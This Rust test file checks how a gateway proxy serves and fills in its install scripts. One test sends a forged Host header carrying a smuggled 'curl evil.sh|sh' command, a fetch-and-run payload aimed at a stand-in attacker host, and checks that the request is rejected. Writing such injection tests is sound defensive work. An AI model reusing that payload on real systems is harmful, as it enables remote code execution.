mod common;

use axum::body::Body;
use axum::http::{Request, StatusCode};
use cocodex_proxy::create_router;
use tower::ServiceExt;

/// The install scripts are served before Setup runs, so no database here.
fn router(public_gateway_url: Option<&str>) -> axum::Router {
    common::pin_codex_version();
    let mut config = common::config(common::offline_settings(), "http://127.0.0.1:1");
    config.public_gateway_url = public_gateway_url.map(str::to_string);
    create_router(config, None)
}

async fn get(router: axum::Router, path: &str, headers: &[(&str, &str)]) -> (StatusCode, String) {
    let mut request = Request::builder().uri(path);
    for (name, value) in headers {
        request = request.header(*name, *value);
    }
    let response = router
        .oneshot(request.body(Body::empty()).unwrap())
        .await
        .unwrap();
    let status = response.status();
    let body = axum::body::to_bytes(response.into_body(), 1 << 20)
        .await
        .unwrap();
    (status, String::from_utf8(body.to_vec()).unwrap())
}

#[tokio::test]
async fn install_sh_carries_the_configured_gateway_url() {
    let (status, body) = get(
        router(Some("https://api.cocodex.app")),
        "/install.sh",
        &[("host", "127.0.0.1:53141")],
    )
    .await;

    assert_eq!(status, StatusCode::OK);
    assert!(body.starts_with("#!/bin/sh"));
    assert!(body.contains("GATEWAY_DEFAULT=\"https://api.cocodex.app\""));
    assert!(!body.contains("GATEWAY_DEFAULT=\"\""));
}

#[tokio::test]
async fn install_sh_falls_back_to_the_request_host() {
    let (status, body) = get(
        router(None),
        "/install.sh",
        &[("host", "gw.example.com"), ("x-forwarded-proto", "https")],
    )
    .await;

    assert_eq!(status, StatusCode::OK);
    assert!(body.contains("GATEWAY_DEFAULT=\"https://gw.example.com\""));
}

#[tokio::test]
async fn install_ps1_carries_the_gateway_url() {
    let (status, body) = get(
        router(Some("https://api.cocodex.app")),
        "/install.ps1",
        &[("host", "api.cocodex.app")],
    )
    .await;

    assert_eq!(status, StatusCode::OK);
    assert!(body.contains("$GatewayUrlDefault = \"https://api.cocodex.app\""));
}

#[tokio::test]
async fn a_forged_host_header_cannot_reach_the_script() {
    let (status, body) = get(
        router(None),
        "/install.sh",
        &[("host", "example.com\";curl evil.sh|sh;\"")],
    )
    .await;

    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body.contains("unknown_gateway_url"));
}

/// The script the gateway hands out has to run as-is, with no arguments.
#[tokio::test]
async fn the_served_script_configures_codex_when_run() {
    let (_, body) = get(
        router(Some("https://api.cocodex.app")),
        "/install.sh",
        &[("host", "api.cocodex.app")],
    )
    .await;

    let home = common::scratch_dir();
    let script = home.join("install.sh");
    std::fs::write(&script, &body).unwrap();

    let output = std::process::Command::new("sh")
        .arg(&script)
        .arg("--no-login")
        .env("HOME", &home)
        .env("SHELL", "/bin/zsh")
        .output()
        .expect("sh is available on every supported platform");
    assert!(
        output.status.success(),
        "install.sh failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let toml = std::fs::read_to_string(home.join(".codex/config.toml")).unwrap();
    assert!(toml.contains("openai_base_url = \"https://api.cocodex.app/backend-api/codex\""));
    assert!(toml.contains("chatgpt_base_url = \"https://api.cocodex.app/backend-api\""));

    let env_file = std::fs::read_to_string(home.join(".codex/cocodex-gateway.env")).unwrap();
    assert!(
        env_file
            .contains("CODEX_REFRESH_TOKEN_URL_OVERRIDE=\"https://api.cocodex.app/oauth/token\"")
    );
    assert!(
        env_file
            .contains("CODEX_REVOKE_TOKEN_URL_OVERRIDE=\"https://api.cocodex.app/oauth/revoke\"")
    );

    let zshrc = std::fs::read_to_string(home.join(".zshrc")).unwrap();
    assert!(zshrc.contains("cocodex-gateway.env"));
}
